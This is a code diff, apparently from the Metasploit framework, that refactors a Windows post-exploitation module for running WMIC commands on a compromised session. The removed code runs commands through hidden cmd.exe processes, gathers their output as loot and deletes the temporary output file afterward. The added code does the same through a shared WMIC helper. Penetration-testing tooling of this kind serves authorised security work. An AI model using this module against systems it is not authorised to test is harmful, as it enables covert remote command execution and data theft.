@@ -8,6 +8,8 @@ require 'rex'
 
 class Metasploit3 < Msf::Post
 
+  include Msf::Post::Windows::WMIC
+
   def initialize(info={})
     super( update_info( info,
       'Name'          => 'Windows Gather Run Specified WMIC Command',
@@ -32,68 +34,37 @@ class Metasploit3 < Msf::Post
     tmpout = ""
     print_status("Running module against #{sysinfo['Computer']}")
     if datastore['RESOURCE']
-
       if ::File.exists?(datastore['RESOURCE'])
 
-        ::File.open(datastore['RESOURCE'], "br").each_line do |cmd|
+        ::File.open(datastore['RESOURCE']).each_line do |cmd|
 
           next if cmd.strip.length < 1
           next if cmd[0,1] == "#"
           print_status "Running command #{cmd.chomp}"
 
-          wmicexec(cmd.chomp)
-
+          result = wmic_query(cmd.chomp)
+          store_wmic_loot(result, cmd)
         end
       else
         raise "Resource File does not exists!"
       end
 
     elsif datastore['COMMAND']
-
       cmd = datastore['COMMAND']
-      wmicexec(cmd)
-
+      result = wmic_query(cmd)
+      store_wmic_loot(result, cmd)
     end
   end
 
-  def wmicexec(wmiccmd)
-    tmpout = ''
-    session.response_timeout=120
-    begin
-      tmp = session.fs.file.expand_path("%TEMP%")
-      wmicfl = tmp + "\\"+ sprintf("%.5d",rand(100000))
-      print_status "running command wmic #{wmiccmd}"
-      r = session.sys.process.execute("cmd.exe /c %SYSTEMROOT%\\system32\\wbem\\wmic.exe /append:#{wmicfl} #{wmiccmd}", nil, {'Hidden' => true})
-      sleep(2)
-      #Making sure that wmic finishes before executing next wmic command
-      prog2check = "wmic.exe"
-      found = 0
-      while found == 0
-        session.sys.process.get_processes().each do |x|
-          found =1
-          if prog2check == (x['name'].downcase)
-            sleep(0.5)
-            found = 0
-          end
-        end
-      end
-      r.close
+  def store_wmic_loot(result_text, cmd)
+    command_log = store_loot("host.command.wmic",
+                             "text/plain",
+                             session,
+                             result_text,
+                             "#{cmd.gsub(/\.|\/|\s/,"_")}.txt",
+                             "Command Output \'wmic #{cmd.chomp}\'")
 
-      # Read the output file of the wmic commands
-      wmioutfile = session.fs.file.new(wmicfl, "rb")
-      until wmioutfile.eof?
-        tmpout << wmioutfile.read
-      end
-      wmioutfile.close
-    rescue ::Exception => e
-      print_status("Error running WMIC commands: #{e.class} #{e}")
-    end
-    # We delete the file with the wmic command output.
-    c = session.sys.process.execute("cmd.exe /c del #{wmicfl}", nil, {'Hidden' => true})
-    c.close
-    vprint_status tmpout
-    command_log = store_loot("host.command.wmic", "text/plain", session,tmpout ,
-      "#{wmiccmd.gsub(/\.|\/|\s/,"_")}.txt", "Command Output \'wmic #{wmiccmd.chomp}\'")
     print_status("Command output saved to: #{command_log}")
   end
+
 end
